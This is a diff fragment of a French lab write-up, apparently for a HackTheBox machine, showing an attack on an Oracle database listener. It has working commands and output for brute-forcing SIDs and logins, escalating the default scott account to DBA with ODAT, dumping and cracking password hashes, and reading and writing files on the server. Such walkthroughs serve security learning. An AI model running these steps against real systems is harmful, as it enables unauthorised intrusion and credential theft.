@@ -10,7 +10,7 @@ Knock knock
 
 On commence par l'habituel scan de port qui fait ressortir des listeners Oracle sur une machine Windows Server 2008 R2 :  
 
-```plain
+```
 Nmap scan report for 10.10.10.82
 Host is up (0.023s latency).
 Not shown: 65520 closed ports
@@ -56,7 +56,7 @@ Host script results:
 
 La première étape consiste à trouver des SID valides sur le listener. Et pour cela les outils ne manquent pas. On peut citer *Nmap* :  
 
-```plain
+```
 root@kali:~# nmap -p 1521 --script oracle-sid-brute 10.10.10.82 
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-28 20:53 CEST
 Nmap scan report for 10.10.10.82
@@ -72,7 +72,7 @@ Nmap done: 1 IP address (1 host up) scanned in 97.09 seconds
 
 Le non moins célèbre *Hydra* :  
 
-```plain
+```
 root@kali:~# hydra -L sids.txt oracle-sid://10.10.10.82:1521
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -88,7 +88,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2018-05-14 20:47:58
 
 Et bien sûr Metasploit fait le job :  
 
-```plain
+```
 msf auxiliary(admin/oracle/sid_brute) > exploit
 
 [*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt...
@@ -104,7 +104,7 @@ Une fois que l'on a trouvé un SID valide on passe à la recherche d'un compte v
 
 On peut avoir plus de chances avec le module Metasploit, même s'il n'a pas fonctionné au premier coup dans mon cas (il faut aussi se rappeler que sur HTB, plusieurs personnes peuvent être en train de réaliser simultanément les même attaques) :  
 
-```plain
+```
 msf auxiliary(admin/oracle/oracle_login) > exploit
 
 [*] Starting brute force on 10.10.10.82:1521...
@@ -121,7 +121,7 @@ L'outil de référence qui implémente la plupart des attaques sur Oracle c'est 
 
 Cet outil dispose d'une liste de commandes d'attaques décrivant les différentes actions que l'on peut effectuer via l'exploitation des vulnérabilités :   
 
-```plain
+```
 				  Choose a main command
 all               to run all modules in order to know what it is possible to do
 tnscmd            to communicate with the TNS listener
@@ -153,7 +153,7 @@ clean             clean traces and logs
 
 La première chose à faire est de passer notre compte *SCOTT* en DBA. Ce compte ne l'est pas mais au vu de ses privilèges c'est tout comme :  
 
-```plain
+```
 LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2/ ./odat.py privesc -s 10.10.10.82 -U scott -P tiger -d XE --get-privs
 
 [1] (10.10.10.82:1521): Get system privileges and roles of current Oracle user
@@ -181,7 +181,7 @@ LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2/ ./odat.py privesc -s 10.10.10.82
 
 Parmi les techniques d'escalade de privilèges Oracle supportées par ODAT l'une correspond à l'utilisation de CREATE PROCEDURE :  
 
-```plain
+```
 LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2/ ./odat.py privesc -s 10.10.10.82 -U scott -P tiger -d XE --dba-with-execute-any-procedure --sysdba
 
 [1] (10.10.10.82:1521): Grant DBA role to current user with CREATE/EXECUTE ANY PROCEDURE method
@@ -190,13 +190,13 @@ LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2/ ./odat.py privesc -s 10.10.10.82
 
 J'ai lu sur le web qu'il fallait parfois déverrouiller le compte. Pour cela il faut se connecter avec *sqlplus* (*sqlplus scott/tiger@10.10.10.82/XE*) et rentrer la commande suivante (le début est bien sûr l'invite) :  
 
-```plain
+```
 SQL> alter user scott account unlock;
 ```
 
 On peut alors tester certaines commandes comme le *passwordstealer* :  
 
-```plain
+```
 LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2/ ./odat.py passwordstealer -s 10.10.10.82 -d XE -U scott -P tiger  --get-passwords 
 
 [1] (10.10.10.82:1521): Try to get Oracle hashed passwords
@@ -240,13 +240,13 @@ F894844C34402B67:SCOTT
 
 Ces hash 10g sont cassables via hashcat. On les recopie dans un fichier et on lance hashcat de cette manière :  
 
-```plain
+```
 hashcat -m 3100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 On se retrouve avec les comptes suivants :  
 
-```plain
+```
 F894844C34402B67:SCOTT:TIGER                     
 E76A6BD999EF9FF1:XDB:ORACLE                      
 D1D21CA56994CAB6:CTXSYS:ORACLE                   
@@ -255,7 +255,7 @@ CE4A36B8E06CA59C:DIP:DIP
 
 Mais plutôt que d'essayer au hasard les attaques supportées, ODAT est capable de détecter ce qu'il est possible d'exploiter sur le listener :  
 
-```plain
+```
 [2] (10.10.10.82:1521): Testing all modules on the XE SID with the scott/tiger account
 [2.1] UTL_HTTP library ?
 [-] KO
@@ -297,7 +297,7 @@ Mais plutôt que d'essayer au hasard les attaques supportées, ODAT est capable 
 
 Dès lors il suffit de croiser ces informations avec les descriptions vues plus tôt pour par exemple pouvoir télécharger un fichier du système.  
 
-```plain
+```
 LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2/ ./odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger  --getFile 'c:/Users/Administrator/Desktop' root.txt /tmp/root.txt
 
 [1] (10.10.10.82:1521): Read the root.txt file stored in c:/Users/Administrator/Desktop on the 10.10.10.82 server
@@ -314,7 +314,7 @@ C'est bien beau mais ironiquement il nous manque le *user.txt* et on ne connait 
 
 Il est temps de voir si on peut utiliser ODAT pour écrire un fichier sur la racine web (puisqu'un serveur IIS tourne) :  
 
-```plain
+```
 LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2/ ./odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger  --putFile 'c:/inetpub/wwwroot' test_xxx.txt test_xxx.txt
 
 [1] (10.10.10.82:1521): Put the test_xxx.txt local file in the c:/inetpub/wwwroot folder like test_xxx.txt on the 10.10.10.82 server
